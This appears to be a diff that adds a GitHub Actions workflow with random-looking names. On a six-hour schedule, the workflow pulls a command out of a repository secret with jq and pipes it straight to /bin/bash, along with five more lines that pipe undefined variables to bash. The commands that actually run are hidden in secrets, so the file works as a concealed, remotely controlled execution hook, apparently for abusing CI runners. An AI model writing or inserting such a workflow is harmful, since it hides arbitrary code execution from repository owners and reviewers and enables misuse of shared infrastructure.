@@ -1,0 +1,21 @@
+name: yuanzudi5678
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '21 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yuanzudi5678
+        env:
+          xz9: ${{ secrets.xz9 }}
+        run: |
+          echo $xz9 | jq -r .m838 | /bin/bash
+          echo $hfji27 | jq -r .hjk5303 | /bin/bash
+          echo $zqspk4 | jq -r .hq9 | /bin/bash
+          echo $eqllb4637 | jq -r .qeknb0909 | /bin/bash
+          echo $le2873 | jq -r .ontk17 | /bin/bash
+          echo $pank5 | jq -r .mki08 | /bin/bash
+
